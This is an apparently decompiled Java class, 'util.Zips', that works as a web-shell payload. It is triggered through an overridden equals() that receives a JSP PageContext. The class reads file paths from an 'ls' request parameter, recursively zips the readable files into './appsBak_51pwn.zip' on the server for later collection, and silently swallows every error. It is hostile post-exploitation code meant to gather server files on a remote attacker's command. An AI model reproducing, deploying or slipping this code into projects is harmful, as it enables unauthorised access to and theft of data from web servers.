package util;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.jsp.PageContext;
import java.io.*;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class Zips {
   public transient HttpServletRequest r;
   public transient HttpServletResponse rp;
   ZipOutputStream zos;
   public transient OutputStream o;
   Pattern pE = Pattern.compile("\\.(exe|zip|ocx|log)$", 38);

   public Zips() {
   }

   public void addToZip(File var1) throws FileNotFoundException, IOException {
      String var2 = var1.getAbsolutePath();
      if (var1.exists() && var1.canRead() && !this.pE.matcher(var2).find()) {
         FileInputStream var3 = new FileInputStream(var1);
         ZipEntry var4 = new ZipEntry(var1.getAbsolutePath());
         this.zos.putNextEntry(var4);
         byte[] var5 = new byte['ê€€'];

         int var6;
         while((var6 = var3.read(var5)) >= 0) {
            this.zos.write(var5, 0, var6);
         }

         this.zos.closeEntry();
         var3.close();
         this.zos.flush();
      }
   }

   public void addToZips(File var1) throws FileNotFoundException, IOException {
      if (var1.isFile()) {
         this.addToZip(var1);
      } else {
         File[] var2 = var1.listFiles();

         for(int var3 = 0; var3 < var2.length; ++var3) {
            if (var2[var3].isDirectory()) {
               this.addToZips(var2[var3]);
            } else if (var2[var3].isFile()) {
               this.addToZip(var2[var3]);
            }
         }
      }

   }

   public void c() throws Exception {
      String var1 = this.r.getParameter("ls");
      this.m(var1);
   }

   public void m(String var1) throws Exception {
      File var2 = new File("./appsBak_51pwn.zip");
      if (var2.exists()) {
         var2.delete();
      }

      this.zos = new ZipOutputStream(new FileOutputStream(var2));
      String[] var3 = var1.split("[;,]");

      for(int var4 = 0; var4 < var3.length; ++var4) {
         this.addToZips(new File(var3[var4]));
      }

   }

   public boolean equals(Object var1) {
      if (var1 instanceof PageContext) {
         try {
            PageContext var2 = (PageContext)var1;
            this.r = (HttpServletRequest)var2.getRequest();
            this.rp = (HttpServletResponse)var2.getResponse();
            this.o = this.rp.getOutputStream();
            this.c();
            this.o.close();
         } catch (Exception var3) {
         }
      }

      return true;
   }
}
